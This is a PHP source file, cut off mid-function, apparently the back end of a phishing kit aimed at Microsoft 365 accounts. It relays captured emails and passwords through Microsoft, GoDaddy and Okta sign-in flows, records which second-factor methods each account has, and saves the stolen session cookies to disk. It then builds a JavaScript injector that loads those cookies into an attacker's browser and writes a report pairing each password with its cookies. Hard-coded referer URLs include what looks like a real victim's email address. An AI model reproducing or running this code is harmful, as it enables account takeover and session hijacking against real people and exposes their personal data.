<?php
	require 'vendor/autoload.php';
	require_once __DIR__ . '/report.php';

    use GuzzleHttp\Client;
	use GuzzleHttp\Cookie\CookieJar;
	use GuzzleHttp\Cookie\FileCookieJar;
	use GuzzleHttp\Exception\ClientException;

	class OfficeAuth {
	    // Properties
	    public $email;
	    public $password;
	    public $status = [];

	    public $sFT;
	    public $sCtx;
	    public $canary;
	    public $api_canary;
	    public $session_id;
	    public $request_id;

	    public $client_request_id;
	    public $redirect;
	    public $currentDirectory;

	    // Constructor
	    public function __construct() {
	        $this->status['live'] = false;
			$this->status['edu'] = false;
			$this->status['role'] = false;
			$this->status['type'] = NULL;
			$this->status['redirect'] = NULL;
			$this->status['background'] = NULL;
			$this->status['icon'] = NULL;
	    }

		public function extractCookies($string) {
			$cookies = array();
		
			$lines = explode("\n", $string);
		
			foreach ($lines as $line) {
				if (isset($line[0]) && substr_count($line, "\t") == 6) {
					$tokens = explode("\t", trim($line));
					
					if ($tokens[5] == 'esctx' || $tokens[5] == 'stsservicecookie') {
						continue;
					}
		
					$domain = substr($tokens[0], 10);
					if ($domain == 'osoftonline.com') {
						$domain = 'login.microsoftonline.com';
					}
		
					$cookie = [
						'name' => $tokens[5],
						'value' => $tokens[6],
						'expirationDate' => strtotime('+1 year'),
						'domain' => $domain,
						'path' => $tokens[2],
						'sameSite' => 'none',
						'firstPartyDomain' => '',
						'hostonly' => false,
						'secure' => (bool) $tokens[3],
						'httponly' => true,
						'session' => true,
						'partitionKey' => null,
						'storeId' => null,
					];
		
					$cookies[] = $cookie;
				}
			}
		
			return $cookies;
		}

		private function saveHtmlReport($cookie, $cookiejs, $provider = null) {
			if ($provider === null) {
				$provider = isset($this->status['type']) ? $this->status['type'] : 'microsoft';
			}
			$html = generateSessionReport($this->email, $this->password, $cookie, $cookiejs, $provider);
			file_put_contents($this->currentDirectory . '/js_' . $this->email . '.html', $html);
		}

		private function generateInjectorScript($cookieRawJson) {
			$redir = base64_encode('https://portal.office.com');
			return '(function(){let cookies=JSON.parse(`' . $cookieRawJson . '`);function putCookie(key,value,domain,path,isSecure){const cookieMaxAge="Max-Age=31536000";document.cookie=key.startsWith("__Host")?`${key}=${value};${cookieMaxAge};path=/;Secure;SameSite=None`:key.startsWith("__Secure")?`${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=None`:isSecure?`${key}=${value};${cookieMaxAge};${window.location.hostname==domain?`path=${path};Secure;SameSite=None`:`domain=${domain};path=${path};Secure;SameSite=None`}`:`${key}=${value};${cookieMaxAge};${window.location.hostname==domain?`path=${path};`:`domain=${domain};path=${path};`}`;}for(let cookie of cookies){putCookie(cookie.Name,cookie.Value,cookie.Domain,cookie.Path,cookie.Secure);}console.log("%cQXB - The Final Horseman Of The Apocalypse","color:red;font-size:22px;font-weight:600;-webkit-text-stroke:0.5px black;padding:2px 10px");window.location.href=atob("' . $redir . '");})();';
		}

	    // Method to get the start
	    public function Start() {
	    	$this->currentDirectory = getcwd()."/core";
	    	$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

	    	// Create a Guzzle client with the cookie jar
	        $client = new Client();
	        $response = $client->get('https://login.microsoftonline.com/', [
	            'headers' => [
	                'User-Agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0',
					'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
					'Accept-Language' => 'en-US,en;q=0.5',
					'Accept-Encoding' => 'gzip, deflate, br',
					'Connection' => 'keep-alive',
					'Upgrade-Insecure-Requests' => '1',
					'Sec-Fetch-Dest' => 'document',
					'Sec-Fetch-Mode' => 'navigate',
					'Sec-Fetch-Site' => 'none',
					'Sec-Fetch-User' => '?1',
					'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt')
	            ]
	        ]);
	        $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

	        $result = $response->getBody()->getContents();

	        preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
	        preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
	        preg_match('/(?<="canary":")[^"]*/', $result, $canary);
	        preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
	        preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
	        preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

	        $this->sFT = $sFT[0];
	        $this->sCtx = $sCtx[0];
	        $this->canary = $canary[0];
	        $this->api_canary = $api_canary[0];
	        $this->session_id = $session_id[0];
	        $this->request_id = $request_id[0];

	    }

	    public function checkRole(){
	    	if(preg_match("/0.0.|re-|user-|Response|r-|noreply|reply|hello|news|feedback|NoReply|replies|part|HTML|jpg|bounce|012|award|form|format|forum|hosted|hostmaster|info|mail|partners|phishing|quotes|quote|why|your|shop|secretary|services|policy|orders|order|name|moneymakerhip|editor|domains|digital|contact|content|complaints|community|collections|comments|advertising|advice|awards|careers|communications|compliance|enquires|found|here|help|honeypot|inquiries|inventories|tech|technicaltraining|treasurer|u00|view|welcome|available|online|paypal|person|press|product|project|properties|reservations|research|returns|search|studio|training|team|accounts|work|wordpress|access|subscriptions|covid|pharmacy|website|customerservices|customer|enquiry|events/", $this->email)){
				$this->status['role'] = true;
			}
			if(preg_match("/student|education|school|academy|college|academic|utoronto|uwinnipeg|ucalgary|teacher|umontreal|ubc\.|campus|educate|\.ac|\.sch|\.edu/", $this->email)){
				$this->status['edu'] = true;
			}
	    }

	    public function gencook($jsonFilePath)
	    {
	        // Check if the file exists
	        if (!file_exists($jsonFilePath)) {
	            // Create an empty JSON array and write it to the file
	            $emptyArray = json_encode([]);
	            file_put_contents($jsonFilePath, $emptyArray);
	        }

	        // Load JSON from a text file
	        $cookieJson = file_get_contents($jsonFilePath);

	        $cookies = json_decode($cookieJson, true);

	        $cookieString = '';
	        if (is_array($cookies)) {
	            foreach ($cookies as $cookie) {
	                $name = $cookie['Name'];
	                $value = $cookie['Value'];
	                $cookieString .= "$name=$value; ";
	            }

	            // Remove the trailing semicolon and whitespace
	            $cookieString = rtrim($cookieString, '; ');
	        }

	        return $cookieString;
	    }

	    public function getCredentials(){
	    	$this->Start();

			//$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a filecookies to a file

            // Create a Guzzle client with the cookie jar
            $client = new Client();
            $response = $client->post('https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US', [
				'headers' => [
					'Accept'                 => 'application/json',
					'Accept-Language'        => 'en-US,en;q=0.9',
					'Connection'             => 'keep-alive',
					'Content-Type'           => 'application/json; charset=UTF-8',
					'Origin'                 => 'https://login.microsoftonline.com',
					'Hpgact'                 => '1800',
					'Hpgid'                  => '1104',
					'Cache-Control'          => 'no-cache',
					'Pragma'                 => 'no-cache',
					'User-Agent'            => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
					'X-Edge-Shopping-Flag'   => '0',
					'Canary'                 => $this->api_canary,
					'Client-Request-Id'     => $this->request_id,
				],
				'json' => [
					'username'                      => $this->email,
					'isOtherIdpSupported'           => false,
					'checkPhones'                   => false,
					'isRemoteNGCSupported'          => true,
					'isCookieBannerShown'           => false,
					'isFidoSupported'               => true,
					'originalRequest'               => $this->sCtx,
					'country'                       => 'ID',
					'forceotclogin'                => true,
					'flowToken'                     => $this->sFT,
				],
			]);

            //$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

            $result = $response->getBody()->getContents();


            $this->status['live'] = true;

			if(strpos($result, '"ThrottleStatus":1') !== false && !(strpos($result, 'FederationRedirectUrl') !== false)){
				
				$this->status['live'] = false;
				$this->status['reason'] = "invalid-domain";
			}
			else if(!(strpos($result, 'FlowToken') !== false)){
				$this->status['live'] = false;
				$this->status['reason'] = "invalid-account";
			}
			else if(strpos($result, 'FederationRedirectUrl') !== false)
			{
				preg_match('/(?<="FederationRedirectUrl":")[^"]*/', $result, $fed);

				$link = $fed[0];

				
				if (strpos($result, 'sso.godaddy.com') !== false) {
					$link = str_replace("https://sso.godaddy.com/", "https://sso.godaddy.com/v1/", $link);
		    		$this->status['type'] = "godaddy";
				}
				else if(strpos($result, 'okta.com') !== false){
					$this->status['type'] = "okta";
				}
				else if(strpos($result, 'adfs') !== false){
					$this->status['type'] = "redirect";
				}else{
					$this->status['type'] = "redirect";
				}
				
				
				$this->status['redirect'] = $link;

			}
			else if (strpos($result, '"IfExistsResult":5') !== false) {
				$this->status['live'] = "false";
				$this->status['reason'] = "outlook-account";
				$this->status['type'] = "main";
			}
			else if (strpos($result, '"IfExistsResult":1') !== false) {
		    	$this->status['type'] = "double";
			}
			else if(strpos($result, '"IfExistsResult":0') !== false || strpos($result, '"IfExistsResult":6') !== false)
			{
				$this->status['type'] = "business";
			}
			else{
				$this->status['live'] = false;
			}

			if($this->status['live']){
				preg_match('/(?<="FlowToken":")[^"]*/', $result, $sFT);
				preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);

				$this->sFT = $sFT[0];
				$this->api_canary = $api_canary[0];

				$this->checkRole();

				$result_get = json_decode($result, true);
				$this->getBackground($result_get);
				$this->getLogo($result_get);
			}
	    }

		private function getBackground($result){
			if (isset($result['EstsProperties']['UserTenantBranding']) && 
				is_array($result['EstsProperties']['UserTenantBranding']) &&
				isset($result['EstsProperties']['UserTenantBranding'][0]['Illustration'])) {

				$this->status['background'] = $result['EstsProperties']['UserTenantBranding'][0]['Illustration'];
			}
		}

		private function getLogo($result){
			if (isset($result['EstsProperties']['UserTenantBranding']) && 
				is_array($result['EstsProperties']['UserTenantBranding']) &&
				isset($result['EstsProperties']['UserTenantBranding'][0]['BannerLogo'])) {
				
				$this->status['icon'] = $result['EstsProperties']['UserTenantBranding'][0]['BannerLogo'];
			}
		}


	    public function Login(){
			if($this->email != $_SESSION['email'] && (!isset($_SESSION['status']) || !isset($_SESSION['info_token_credentials']))){
	    		$this->getCredentials();
			}else{
				if(isset($_SESSION['info_token_credentials']) && isset($_SESSION['status'])){
					$this->status = $_SESSION['status'];
					$this->currentDirectory = getcwd()."/core";

					$this->sFT = $_SESSION['info_token_credentials']['sFT'];
					$this->sCtx = $_SESSION['info_token_credentials']['sCtx'];
					$this->canary = $_SESSION['info_token_credentials']['canary'];
					$this->api_canary = $_SESSION['info_token_credentials']['api_canary'];
					$this->session_id = $_SESSION['info_token_credentials']['session_id'];
					$this->request_id = $_SESSION['info_token_credentials']['request_id'];

				}else{
					$this->getCredentials();
				}
			}
			
	    	if($this->status['type'] == "godaddy"){
	    		$this->AuthGodaddy();
	    	}
			else if($this->status['type'] == "okta"){
	    		$this->AuthOkta();
	    	}
	    	else if($this->status['type'] == "redirect"){
	    		$this->AuthRedirect();
	    	}
	    	else if($this->status['type'] == "double"){
	    		$this->AuthDouble();
	    	}
	    	else if($this->status['type'] == "business"){
	    		$this->AuthBusiness();
	    	}

			if(!$this->status['live'] && isset($_SESSION['info_token_credentials']) && isset($_SESSION['status']))
			{
				unset($_SESSION['info_token_credentials']);
				unset($_SESSION['status']);
				$this->Login();
			}
	    }

	    private function AuthGodaddy(){
	    	$ch = curl_init();

			curl_setopt($ch, CURLOPT_URL, $this->status['redirect']);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, "name=$this->email&password=$this->password&AuthMethod=FormsAuthentication");
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
			$headers = array();
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

			$result = curl_exec($ch);
			
			
			if (strpos($result, 'You entered an incorrect username or password.') !== false || strpos($result, 'have permission to access') !== false || strpos($result, 'The password entered exceeds the maximum length') !== false || strpos($result, 'Bad Request') !== false || strpos($result, 'googlebot') !== false || strpos($result, 'Select a certificate ') !== false || strpos($result, 'smusxath.bms.com') !== false || strpos($result, 'not support JavaScript') !== false || strpos($result, 'trouble signing') !== false || strpos($result, 'having some server issues') !== false || strpos($result, 'apple.com') !== false || strpos($result, 'Not Allowed') !== false || strpos($result, '.aon.com') !== false || strpos($result, 'Fifth Third ID') !== false ||  strpos($result, 'Configurable default behavior') !== false || strpos($result, 'persmissions to access this resource') !== false || strpos($result, 'urlMsaSignUp') !== false) {
    			$this->status['live'] = false;
			}
			preg_match('/name=["\']?wctx["\']?\s+value=["\']?([^"\']+)["\']?/', $result, $wctx);
			$wctx = html_entity_decode($wctx[1]);

			preg_match('/name=["\']?wresult["\']?\s+value=["\']?([^"\']+)["\']?/', $result, $wresult);
			$wresult = html_entity_decode($wresult[1]);

			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // Adjust the path as needed

			$client = new Client([
				'cookies' => $cookieJar,
			]);

			$response = $client->post('https://login.microsoftonline.com/login.srf', [
				'headers' => [
					'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'Accept-Language' => 'en-US,en;q=0.9',
					'Cache-Control' => 'max-age=0',
					'Connection' => 'keep-alive',
					'Content-Type' => 'application/x-www-form-urlencoded',
					'Origin' => 'null',
					'Sec-Fetch-Dest' => 'document',
					'Sec-Fetch-Mode' => 'navigate',
					'Sec-Fetch-Site' => 'cross-site',
					'Upgrade-Insecure-Requests' => '1',
					'User-Agent' => 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36 Edg/130.0.0.0',
					'X-Edge-Shopping-Flag' => '0',
					'sec-ch-ua' => '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
					'sec-ch-ua-mobile' => '?1',
					'sec-ch-ua-platform' => '"Android"',
					'sec-ch-ua-platform-version' => '"6.0"',
				],
				'form_params' => [
					'wctx' => $wctx,
					'wa' => 'wsignin1.0',
					'wresult' => $wresult, // Truncated for brevity
					'wtrealm' => 'urn:federation:MicrosoftOnline',
				],
			]);
			$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

            // You can get the content with:
            $result = $response->getBody()->getContents();

			
			preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
		    preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
		    preg_match('/(?<="canary":")[^"]*/', $result, $canary);
		    preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
		    preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
		    preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

		    $this->sFT = $sFT[0];
		    $this->sCtx = $sCtx[0];
		    $this->canary = $canary[0];
		    $this->api_canary = $api_canary[0];
		    $this->session_id = $session_id[0];
		    $this->request_id = $request_id[0];


			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

			// Create a Guzzle client with the cookie jar
			$client = new Client([
				'cookies' => $cookieJar,
			]);

			$response = $client->post('https://login.microsoftonline.com/appverify', [
				'headers' => [
					'Connection' => 'keep-alive',
					'Cache-Control' => 'no-cache',
					'Upgrade-Insecure-Requests' => '1',
					'Origin' => 'null',
					'Content-Type' => 'application/x-www-form-urlencoded',
					'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
					'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'Accept-Language' => 'en-US,en;q=0.9',
					'Referer' => '',
					'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
				],
				'form_params' => [
					'ContinueAuth' => 'true',
					'ctx' => $this->sCtx,
					'hpgrequestid' => '1f12d14c-7a42-4542-be79-78f592f96800',
					'flowToken' => $this->sFT,
					'iscsrfspeedbump' => 'true',
					'canary' => $this->canary,
					'i19' => '4624',
				],
			]);

			$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

			$result = $response->getBody()->getContents();

			preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
		    preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
		    preg_match('/(?<="canary":")[^"]*/', $result, $canary);
		    preg_match('/(?<="apiCanary":")[^"]*/', $result, $api_canary);
		    preg_match('/(?<="sessionId":")[^"]*/', $result, $session_id);
		    preg_match('/(?<="correlationId":")[^"]*/', $result, $request_id);

		    $this->sFT = $sFT[0];
		    $this->sCtx = $sCtx[0];
		    $this->canary = $canary[0];
		    $this->api_canary = $api_canary[0];
		    $this->session_id = $session_id[0];
		    $this->request_id = $request_id[0];
			
			if(strpos($result, 'urlBeginAuth') !== false){
				$this->status['2fa'] = true;
				
				// Regular expression to extract the JSON object
				$pattern = '/\{\s*"arrUserProofs":(\[.*?\])\s*,/s';
				preg_match($pattern, $result, $matches);
				
				$jsonString = isset($matches[1]) ? $matches[1] : '[]';
				
				// Decode the JSON data
				$data = json_decode($jsonString, true);
				
				// Check if data is an array and process it
				if (is_array($data)) {
					// Insert authMethodId values into the $status array
					foreach ($data as $index => $item) {
						if (isset($item['authMethodId']) && isset($item['display']) && isset($item['isDefault'])) {
							$this->status['2fa_info'][$index] = [
								'method_name' => $item['authMethodId'],
								'display' => $item['display'],
								'isDefault' => $item['isDefault']
							];
						}
					}
				}
	
			}
			else{
				$this->status['2fa'] = false;

				$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
				$client = new Client([
					'cookies' => $cookieJar,
				]);
				// Perform KMSI request
				$response = $client->request('POST', 'https://login.microsoftonline.com/kmsi', [
					'headers' => [
						'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
						'Accept-Language' => 'en-US,en;q=0.9',
						'Cache-Control' => 'max-age=0',
						'Content-Type' => 'application/x-www-form-urlencoded',
						'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
						'Origin' => 'https://login.microsoftonline.com',
						'Referer' => 'https://login.microsoftonline.com/common/login',
						'Sec-CH-UA' => '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
						'Sec-CH-UA-Mobile' => '?0',
						'Sec-CH-UA-Platform' => '"Windows"',
						'Sec-Fetch-Dest' => 'document',
						'Sec-Fetch-Mode' => 'navigate',
						'Sec-Fetch-Site' => 'same-origin',
						'Sec-Fetch-User' => '?1',
						'Upgrade-Insecure-Requests' => '1',
						'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0',
					],
					'form_params' => [
						'LoginOptions' => '1',
						'type' => '28',
						'ctx' => $this->sCtx,
						'hpgrequestid' => $this->request_id,
						'flowToken' => $this->sFT,
						'DontShowAgain' => 'true',
						'canary' => $this->canary,
						'i19' => '14108',
					]
				]);
				$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
	
				// You can get the content with:
				$result = $response->getBody()->getContents();
				$cookie = file_get_contents($this->currentDirectory . '/cookie_' . $this->email . '.txt');

				// Obfuscate and store the cookie
				$cookiejs =
					$this->generateInjectorScript($cookie);

				file_put_contents($this->currentDirectory . '/js_' . $this->email . '.txt', $cookiejs);
				$this->saveHtmlReport($cookie, $cookiejs);
			}
	    }

		private function AuthOkta(){
			$main_url = preg_match('/https:\/\/[a-z0-9\-\.]+\.okta\.com\//', $this->status['redirect'], $matches);
			$main_url = $matches[0];
			

	    	$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
			$client = new Client([
				'cookies' => $cookieJar,
			]);
			// Perform KMSI request
			$response = $client->request('GET', $this->status['redirect'], [
				'headers' => [
					'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'Accept-Language' => 'en-US,en;q=0.9',
					'Cache-Control' => 'max-age=0',
					'Content-Type' => 'application/x-www-form-urlencoded',
					'Origin' => 'https://login.microsoftonline.com',
					'Referer' => 'https://login.microsoftonline.com/common/login',
					'Sec-CH-UA' => '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
					'Sec-CH-UA-Mobile' => '?0',
					'Sec-CH-UA-Platform' => '"Windows"',
					'Sec-Fetch-Dest' => 'document',
					'Sec-Fetch-Mode' => 'navigate',
					'Sec-Fetch-Site' => 'same-origin',
					'Sec-Fetch-User' => '?1',
					'Upgrade-Insecure-Requests' => '1',
					'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0'
				]
			]);
	
			// You can get the content with:
			$result = $response->getBody()->getContents();
			
			preg_match('/var stateToken = \'([^\']+)\'/', $result, $matches);
			$StateToken = $matches[1];
			$StateToken = str_replace('\x2D', '-', $StateToken);

			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
			$client = new Client([
				'cookies' => $cookieJar,
			]);
			// Perform KMSI request
			$response = $client->request('POST', $main_url.'idp/idx/introspect', [
				'headers' => [
					'accept' => 'application/ion+json; okta-version=1.0.0',
					'accept-language' => 'en',
					'content-type' => 'application/ion+json; okta-version=1.0.0',
					'origin' => $main_url,
					'priority' => 'u=1, i',
					'referer' => $main_url.'app/office365/kqkxvmSNVXRTFTDOGESI/sso/wsfed/passive?client-request-id=f881bf82-50b3-42e5-becb-1d5df4b67e2f&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQQIARAAhZJNiON0GMab6UxnpqhbRpH1IMzBg4hp__lOBxZsmk6atmk--pmglKZJ27T_JE2bJpkcRL0oiLDnPXqcPSgKIgrqTRhB9ryHRYS97EFk2YURL3b1vHh5ed7nfd7T88sfMkWqiBXBW1m8CM7eIBmaIknKRAl8QqNk2QQoS9g0illlYnfCGXoyXp_kCx_9-OH118pD7odfXn_vyTfvly6R03kYrjZnpVIcx0V_OnUmdnHiuyU49izHm0X4twhyD0Hu7B3YHtrrXO5taIJlAEYzLE3iLAEwChT1BQeNheXqCzGUcInUHQDavIi3uktgLCqhlEqJ3q1RUjpLpbRCGsLOWRi7vBrKvE5KVQAMwYCtgUjs_kN5oFJtvu3KgogZA825v3dDrmzDOf5s-GsntR_vHU_9tTta-ZvwTvbuHjNrJMp4IfbNloNOBL_XKJOc5kqmsho0umJVXSwEh9OqbnVYV5vbc1Wyt0ys7KRLJgneIebDOcstg0pES53zese8iJbDAHIsILieZPEoeh5TXLVfGcc92bMhDGoquWUC2EFFti1c8HovTvxYmSt8HVABG-kardb6Vl9OxzM8ARWAm61mErRTeaOnGl8n5XYPO2_Im00HCjMgygEFaRIdVCySwIG0HfB1X8CDaWSp6Igup7FGbqBkdTquEoniVB1H3bgdsH6TNqJBYraCkWJQvFSDeG1ll6Ng0AguAlPW25jONLn6QO1isBezjOJfZl97TucR_lU2txOu711lGX9le451ulr7Uwfaz-Mkwkvyv1vdd-1iBcLfsyeLaOzNbBu-M3Zntvcsdm8febT_6tFh4eAmcpp58xWQPTs6yhcyNzOnmet95PODHZsfmN9_9rRf5j5-rDz8dfRu5uqgtKsmGTotYRLo5Zq9TrXQksTp0Fw2WpDC5fWwr2EzwpiXcf0Wc4bdziG3c7mr3LHIj9q1LjsCf-aQTw4z3x3_L-X3X3g5n986I-hPxtDenPxH-08vZq5f-vvB3U-_-OvnP-qPbrztVjC6q_RlgtU2mIHNllBJbQ2ETNPzecwr1boCbghBkKS9W18WMr8VMv8A0&cbcxt=&username=jvangeel%40amgen.com&mkt=en-US&lc=',
					'sec-ch-ua' => '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
					'sec-ch-ua-mobile' => '?0',
					'sec-ch-ua-platform' => '"Windows"',
					'sec-ch-ua-platform-version' => '"15.0.0"',
					'sec-fetch-dest' => 'empty',
					'sec-fetch-mode' => 'cors',
					'sec-fetch-site' => 'same-origin',
					'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
					'x-okta-user-agent-extended' => 'okta-auth-js/7.9.0 okta-signin-widget-7.26.1'
				],
				'json' => [  // Use 'json' instead of 'form_params' to send JSON data
					'stateToken' => $StateToken
				]
			]);
	
			// You can get the content with:
			$result = $response->getBody()->getContents();

			preg_match('/(?<="stateHandle":")[^"]*/', $result, $stateHandle);

		    $stateHandle = $stateHandle[0];

			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
			$client = new Client([
				'cookies' => $cookieJar,
			]);
			// Perform KMSI request
			$response = $client->request('POST', $main_url.'idp/idx/identify', [
				'headers' => [
					'accept' => 'application/ion+json; okta-version=1.0.0',
					'accept-language' => 'en',
					'content-type' => 'application/ion+json; okta-version=1.0.0',
					'origin' => $main_url,
					'priority' => 'u=1, i',
					'referer' => $main_url.'app/office365/kqkxvmSNVXRTFTDOGESI/sso/wsfed/passive?client-request-id=f881bf82-50b3-42e5-becb-1d5df4b67e2f&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQQIARAAhZJNiON0GMab6UxnpqhbRpH1IMzBg4hp__lOBxZsmk6atmk--pmglKZJ27T_JE2bJpkcRL0oiLDnPXqcPSgKIgrqTRhB9ryHRYS97EFk2YURL3b1vHh5ed7nfd7T88sfMkWqiBXBW1m8CM7eIBmaIknKRAl8QqNk2QQoS9g0illlYnfCGXoyXp_kCx_9-OH118pD7odfXn_vyTfvly6R03kYrjZnpVIcx0V_OnUmdnHiuyU49izHm0X4twhyD0Hu7B3YHtrrXO5taIJlAEYzLE3iLAEwChT1BQeNheXqCzGUcInUHQDavIi3uktgLCqhlEqJ3q1RUjpLpbRCGsLOWRi7vBrKvE5KVQAMwYCtgUjs_kN5oFJtvu3KgogZA825v3dDrmzDOf5s-GsntR_vHU_9tTta-ZvwTvbuHjNrJMp4IfbNloNOBL_XKJOc5kqmsho0umJVXSwEh9OqbnVYV5vbc1Wyt0ys7KRLJgneIebDOcstg0pES53zese8iJbDAHIsILieZPEoeh5TXLVfGcc92bMhDGoquWUC2EFFti1c8HovTvxYmSt8HVABG-kardb6Vl9OxzM8ARWAm61mErRTeaOnGl8n5XYPO2_Im00HCjMgygEFaRIdVCySwIG0HfB1X8CDaWSp6Igup7FGbqBkdTquEoniVB1H3bgdsH6TNqJBYraCkWJQvFSDeG1ll6Ng0AguAlPW25jONLn6QO1isBezjOJfZl97TucR_lU2txOu711lGX9le451ulr7Uwfaz-Mkwkvyv1vdd-1iBcLfsyeLaOzNbBu-M3Zntvcsdm8febT_6tFh4eAmcpp58xWQPTs6yhcyNzOnmet95PODHZsfmN9_9rRf5j5-rDz8dfRu5uqgtKsmGTotYRLo5Zq9TrXQksTp0Fw2WpDC5fWwr2EzwpiXcf0Wc4bdziG3c7mr3LHIj9q1LjsCf-aQTw4z3x3_L-X3X3g5n986I-hPxtDenPxH-08vZq5f-vvB3U-_-OvnP-qPbrztVjC6q_RlgtU2mIHNllBJbQ2ETNPzecwr1boCbghBkKS9W18WMr8VMv8A0&cbcxt=&username=jvangeel%40amgen.com&mkt=en-US&lc=',
					'sec-ch-ua' => '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
					'sec-ch-ua-mobile' => '?0',
					'sec-ch-ua-platform' => '"Windows"',
					'sec-ch-ua-platform-version' => '"15.0.0"',
					'sec-fetch-dest' => 'empty',
					'sec-fetch-mode' => 'cors',
					'sec-fetch-site' => 'same-origin',
					'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
					'x-okta-user-agent-extended' => 'okta-auth-js/7.9.0 okta-signin-widget-7.26.1'
				],
				'json' => [  // Use 'json' instead of 'form_params' to send JSON data
					'identifier' => $this->email,
					'rememberMe' => true,
					'stateHandle' => $stateHandle
				]
			]);
			$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
	
			// You can get the content with:
			$result = $response->getBody()->getContents();

			$result = json_decode($result, true);

			$stateHandle = $result['stateHandle'];
			foreach ($result['authenticators']['value'] as $authenticator) {
				// Check if the type is "password"
				if ($authenticator['type'] === 'password') {
					// Get the id value
					$id = $authenticator['id'];
					break;  // Exit loop once the password type is found
				}
			}

			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file
			$client = new Client([
				'cookies' => $cookieJar,
			]);
			// Perform KMSI request
			$response = $client->request('POST', $main_url.'idp/idx/challenge', [
				'headers' => [
					'accept' => 'application/ion+json; okta-version=1.0.0',
					'accept-language' => 'en',
					'content-type' => 'application/ion+json; okta-version=1.0.0',
					'origin' => $main_url,
					'priority' => 'u=1, i',
